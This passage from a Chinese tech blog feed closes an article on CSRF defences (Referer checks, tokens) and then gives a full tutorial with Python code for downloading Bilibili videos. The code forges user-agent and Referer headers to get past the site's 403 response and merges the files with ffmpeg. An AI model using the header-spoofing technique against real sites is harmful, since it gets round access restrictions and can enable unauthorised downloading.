Check也可以被用于检查请求是否来自合法的“源”（Referer值是否是指定页面，或者网站的域），如果都不是，那么就极可能是CSRF攻击。</p><p>但是因为服务器并不是什么时候都能取到Referer，所以也无法作为CSRF防御的主要手段。</p><p>​    ④ Token认证</p><p>Token 即标志，记号的意思，也叫作令牌。</p><p>例子：</p><ol><li>用户访问某个表单页面。</li><li>服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。</li><li>在页面表单附带上Token参数。</li><li>用户提交请求后， 服务端验证表单中的Token是否与用户Session（或Cookies）中的Token一致，一致为合法请求，不是则非法请求。</li></ol><p>这个Token的值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露。</p><blockquote><p>CSRF的Token仅仅适用于对抗CSRF攻击。当网站同时存在XSS漏洞时候，那这个方案也是空谈。因为攻击者可以通过js获取Token值。</p></blockquote><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://blog.csdn.net/weixin_44940180/article/details/107140456">Pikachu之CSRF</a></p><p>[2] <a href="https://blog.csdn.net/m0_37732829/article/details/90513122?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">Web安全之CSRF攻击</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全学习 </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python爬虫轻松搞定B站视频下载</title>
      <link href="posts/3575.html"/>
      <url>posts/3575.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在正常情况下（不使用其他工具或插件），Web端的bilibili似乎无法（彻底白嫖）下载视频，遂学习了如何利用Python爬虫下载b站视频（不包括会员视频），详情（手法）且看下文。</p><blockquote><p>参考视频：<a href="https://www.bilibili.com/video/BV1Fy4y1D7XS">https://www.bilibili.com/video/BV1Fy4y1D7XS</a></p><p>在分析b站网页源代码的过程中发现其视频和音频是分开的，下载后一个只有声音，一个只有画面，这显然不能满足我们的要求。解决方案是：利用 <a href="http://www.ffmpeg.org/download.html">ffmpeg</a> 这款强大的开源工具把下载后的音视频进行合并。故想要完美体验，先得下载安装并配置好 <code>ffmpeg</code> 。（到官网下载，解压后把文件夹内的<code>bin</code> 添加到环境变量）</p><p>Python中使用到的模块有：<code>requests</code>、<code>re</code>、<code>json</code>、<code>subprocess</code>、<code>os</code></p></blockquote><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>视频的<code>url</code>比较显眼，容易获取。<code>headers</code>也好找，但还需要一重要信息。</p><p>通过浏览器（F12）查看分析目标网页，找到我们的下一目标，即视（音）频下载链接。</p><p>一番查找后，发现在<code>head</code>里的第四个<code>script</code> 标签内似乎有我们想要的东西。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210321234819818.png" alt="image-20210321234819818"></p><p>可访问此链接，却出现403，即没有权限访问此站。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210321235102571.png" alt="image-20210321235102571"></p><p>这又怎么回事？查看Request Headers 信息，发现没有referer这一项，于是尝试在数据包中加上referer信息看能否访问。（这里直接上bp了）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210321235900739.png" alt="image-20210321235900739"></p><p>Forward后，出现文件下载页面。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322000022154.png" alt="image-20210322000022154"></p><p>下载后打开改文件，确为目标视频。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322000250594.png" alt="image-20210322000250594"></p><h1 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h1><p>通过requests库向目标站点发起请求，请求需包含header、referer等信息，以伪装成是浏览器发出请求。如果服务器能正常响应，会得到一个Response，便是所要获取的页面内容。</p><p>测试代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers) <span class="comment">#发送get请求，获得响应</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">html_data = send_request(<span class="string">&quot;https://www.bilibili.com/video/BV1Qy4y147H1&quot;</span>).text</span><br><span class="line">print(html_data)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322002017006.png" alt="image-20210322002017006"></p><h1 id="解析内容"><a href="#解析内容" class="headerlink" title="解析内容"></a>解析内容</h1><p>得到的内容可能是HTML、json等格式，可以用页面解析库、正则表达式等进行解析。</p><p><strong>title</strong>信息比较好找，就在head中。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322003021075.png" alt="image-20210322003021075"></p><p>利用正则表达式对其进行提取。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><strong>音视频下载链接</strong>在json数据中。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322003718230.png" alt="image-20210322003718230"></p><p>利用正则表达式和字典（列表）的“键”对其提取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">json_data &#x3D; re.findall(r&#39;&lt;script&gt;window.__playinfo__&#x3D;(.*?)&lt;&#x2F;script&gt;&#39;,html_data)[0]</span><br><span class="line">    json_data &#x3D; json.loads(json_data) #解码 JSON 数据，返回 Python 字段的数据类型。</span><br><span class="line">    audio_url &#x3D; json_data[&quot;data&quot;][&quot;dash&quot;][&quot;audio&quot;][0][&quot;backupUrl&quot;][0]</span><br><span class="line">    video_url &#x3D; json_data[&quot;data&quot;][&quot;dash&quot;][&quot;video&quot;][0][&quot;backupUrl&quot;][0]</span><br></pre></td></tr></table></figure><p>测试代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    <span class="comment">#pprint.pprint(json_data)</span></span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line">html_data = send_request(<span class="string">&quot;https://www.bilibili.com/video/BV1Qy4y147H1&quot;</span>).text</span><br><span class="line">video_data = get_video_data(html_data)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> video_data:</span><br><span class="line">    print(item)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322004738048.png" alt="image-20210322004738048"></p><h1 id="保存数据"><a href="#保存数据" class="headerlink" title="保存数据"></a>保存数据</h1><p>通过下载链接，将音视频下载到本地并保存。</p><p>测试代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">file_name,audio_url,video_url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;正在下载 &quot;</span> + file_name + <span class="string">&quot;的音频...&quot;</span>)</span><br><span class="line">    audio_data = send_request(audio_url).content</span><br><span class="line">    print(<span class="string">&quot;完成下载 &quot;</span> + file_name + <span class="string">&quot;的音频！&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;正在下载 &quot;</span> + file_name + <span class="string">&quot;的视频...&quot;</span>)</span><br><span class="line">    video_data = send_request(video_url).content</span><br><span class="line">    print(<span class="string">&quot;完成下载 &quot;</span> + file_name + <span class="string">&quot;的视频！&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp3&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(audio_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp4&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(video_data)</span><br><span class="line"></span><br><span class="line">html_data = send_request(<span class="string">&quot;https://www.bilibili.com/video/BV1Qy4y147H1&quot;</span>).text</span><br><span class="line">video_data = get_video_data(html_data)</span><br><span class="line">save_data(video_data[<span class="number">0</span>],video_data[<span class="number">1</span>],video_data[<span class="number">2</span>])</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010005615.png" alt="image-20210322010005615"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010033745.png" alt="image-20210322010033745"></p><h1 id="合并音视频"><a href="#合并音视频" class="headerlink" title="合并音视频"></a>合并音视频</h1><p>把分开的音频和视频进行合并。（几次测试下来，发现如果用视频标题作为文件名去执行ffmpeg命令会导致其出现错误，暂时没找到解决方法，后来试着将文件名先重命名为1.mp3、1.mp4这种简单的名字，可以完成合并，再删除之)</p><p>测试代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">file_name,audio_url,video_url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;正在下载 &quot;</span> + file_name + <span class="string">&quot;的音频...&quot;</span>)</span><br><span class="line">    audio_data = send_request(audio_url).content</span><br><span class="line">    print(<span class="string">&quot;完成下载 &quot;</span> + file_name + <span class="string">&quot;的音频！&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;正在下载 &quot;</span> + file_name + <span class="string">&quot;的视频...&quot;</span>)</span><br><span class="line">    video_data = send_request(video_url).content</span><br><span class="line">    print(<span class="string">&quot;完成下载 &quot;</span> + file_name + <span class="string">&quot;的视频！&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp3&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(audio_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp4&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(video_data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_data</span>(<span class="params">video_name</span>):</span></span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp3&quot;</span>,<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp4&quot;</span>,<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;正在合并 &quot;</span> + video_name + <span class="string">&quot;的视频...&quot;</span>)</span><br><span class="line">    subprocess.call(<span class="string">&quot;ffmpeg -i 1.mp4 -i 1.mp3 -c:v copy -c:a aac -strict experimental output.mp4&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">    os.rename(<span class="string">&quot;output.mp4&quot;</span>, video_name + <span class="string">&quot;.mp4&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;完成合并 &quot;</span> + video_name + <span class="string">&quot;的视频！&quot;</span>)</span><br><span class="line"></span><br><span class="line">html_data = send_request(<span class="string">&quot;https://www.bilibili.com/video/BV1Qy4y147H1&quot;</span>).text</span><br><span class="line">video_data = get_video_data(html_data)</span><br><span class="line">save_data(video_data[<span class="number">0</span>],video_data[<span class="number">1</span>],video_data[<span class="number">2</span>])</span><br><span class="line">merge_data(video_data[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010405722.png" alt="image-20210322010405722"></p><p>合并后视频正常播放，有声有色。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010551889.png" alt="image-20210322010551889"></p><h1 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding : utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2021/3/21 16:11</span></span><br><span class="line"><span class="comment"># @Author : wawyw</span></span><br><span class="line"><span class="comment"># @File : bilibili_video.py</span></span><br><span class="line"><span class="comment"># @Software : PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">file_name,audio_url,video_url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;正在下载 &quot;</span> + file_name + <span class="string">&quot;的音频...&quot;</span>)</span><br><span class="line">    audio_data = send_request(audio_url).content</span><br><span class="line">    print(<span class="string">&quot;完成下载 &quot;</span> + file_name + <span class="string">&quot;的音频！&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;正在下载 &quot;</span> + file_name + <span class="string">&quot;的视频...&quot;</span>)</span><br><span class="line">    video_data = send_request(video_url).content</span><br><span class="line">    print(<span class="string">&quot;完成下载 &quot;</span> + file_name + <span class="string">&quot;的视频！&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp3&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(audio_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp4&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(video_data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_data</span>(<span class="params">video_name</span>):</span></span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp3&quot;</span>,<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp4&quot;</span>,<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;正在合并 &quot;</span> + video_name + <span class="string">&quot;的视频...&quot;</span>)</span><br><span class="line">    subprocess.call(<span class="string">&quot;ffmpeg -i 1.mp4 -i 1.mp3 -c:v copy -c:a aac -strict experimental output.mp4&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">    os.rename(<span class="string">&quot;output.mp4&quot;</span>, video_name + <span class="string">&quot;.mp4&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;完成合并 &quot;</span> + video_name + <span class="string">&quot;的视频！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;输入bilibili视频对应的链接即可下载：&quot;</span>)</span><br><span class="line">    html_data = send_request(url).text</span><br><span class="line">    video_data = get_video_data(html_data)</span><br><span class="line">    save_data(video_data[<span class="number">0</span>],video_data[<span class="number">1</span>],video_data[<span class="number">2</span>])</span><br><span class="line">    merge_data(video_data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010945179.png" alt="image-20210322010945179"></p><blockquote><p>虽说这次是将白嫖进行到底了，但B站UP主们创作视频确实不易，我们也从中收获很多，能三连还是要多多支持下~</p></blockquote><hr><h1 id="打包成exe"><a href="#打包成exe" class="headerlink" title="打包成exe"></a>打包成exe</h1><p>首先我们要先安装Pyinstaller，直接在cmd使用pip命令</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstaller 